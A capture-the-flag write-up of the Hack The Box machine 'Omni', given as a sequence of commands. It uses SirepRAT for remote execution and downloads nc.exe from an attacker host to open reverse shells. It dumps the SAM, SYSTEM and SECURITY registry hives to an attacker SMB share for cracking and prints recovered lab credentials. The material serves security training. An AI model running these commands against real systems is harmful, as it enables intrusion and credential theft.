## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)

---

## 🛰️ Recon

**Full Port Scan**
```bash
nmap -p- --min-rate 10000 -oA scans/alltcp 10.10.10.204
```

**Service Version Scan**
```bash
nmap -p 135,5985,8080,29817,29819,29820 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.204
```

---

## 🌐 Web Enumeration

**[HTTP](HTTP.md) on port 8080 prompts for auth:**  
> Realm: *Windows Device Portal*

Add to `/etc/hosts`:
```bash
echo "10.10.10.204 omni.htb" | sudo tee -a /etc/hosts
```

---

## 🧰 Exploitation - SYSTEM Access via Sirep

**Tool**: [SirepRAT](https://github.com/SafeBreach-Labs/SirepRAT)

**Basic Command Execution**
```bash
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "cmd.exe" --args ' /c dir c:\ '
```

**Working Directory for Staging**
```bash
dir c:\windows\system32\spool\drivers\color /b
```

**Upload nc.exe**
```bash
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "cmd.exe" --args ' /c powershell Invoke-WebRequest -outfile c:\windows\system32\spool\drivers\color\nc.exe -uri http://10.10.14.6/nc64.exe'
```

**Start Listener**
```bash
rlwrap nc -lnvp 443
```

**Execute Reverse Shell**
```bash
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "cmd.exe" --args ' /c c:\windows\system32\spool\drivers\color\nc.exe -e cmd 10.10.14.6 443'
```

---

## 🪪 SYSTEM to app

**user.txt is encrypted**
```powershell
(Import-CliXml -Path C:\data\users\app\user.txt).GetNetworkCredential().Password
```

---

## 🔐 Dumping Hashes (Alternate method)

**Start SMB Server**
```bash
smbserver.py share . -smb2support -username df -password df
```

**Mount Share & Dump Registry**
```cmd
net use \\10.10.14.6\share /user:df df
reg save HKLM\sam \\10.10.14.6\share\sam
reg save HKLM\system \\10.10.14.6\share\system
reg save HKLM\security \\10.10.14.6\share\security
```

**Extract with secretsdump**
```bash
secretsdump.py -sam sam -security security -system system LOCAL
```

**Crack with Hashcat or Jupyter Notebook (Penglab)**

---

## 🧑‍💻 Shell as app via HTTP:8080 (Windows Device Portal)

**Login with creds**
```text
Username: app
Password: mesh5143
```

**Command Execution on Portal**:  
```powershell
powershell -c "Invoke-WebRequest -Uri http://10.10.14.6/nc64.exe -OutFile C:\windows\system32\spool\drivers\color\nc.exe"
C:\windows\system32\spool\drivers\color\nc.exe -e cmd 10.10.14.6 443
```

---

## 🔑 Privesc app → administrator

**Found Cred Dump File**
```powershell
Import-CliXml -Path iot-admin.xml
```

**Get Creds**
```powershell
(Import-CliXml -Path iot-admin.xml).GetNetworkCredential() | fl
```

**Output:**
```text
Username : administrator
Password : _1nt3rn37ofTh1nGz
```

---

## 🧑‍🔬 Shell as Administrator

**Login to Portal with Admin Credentials**

**Reverse Shell**
```powershell
powershell -c "Invoke-WebRequest -Uri http://10.10.14.6/nc64.exe -OutFile C:\windows\system32\spool\drivers\color\nc.exe"
C:\windows\system32\spool\drivers\color\nc.exe -e cmd 10.10.14.6 443
```

---

## 🏁 Loot Flags

**Get root.txt**
```powershell
(Import-CliXml -Path C:\data\users\administrator\root.txt).GetNetworkCredential().Password
```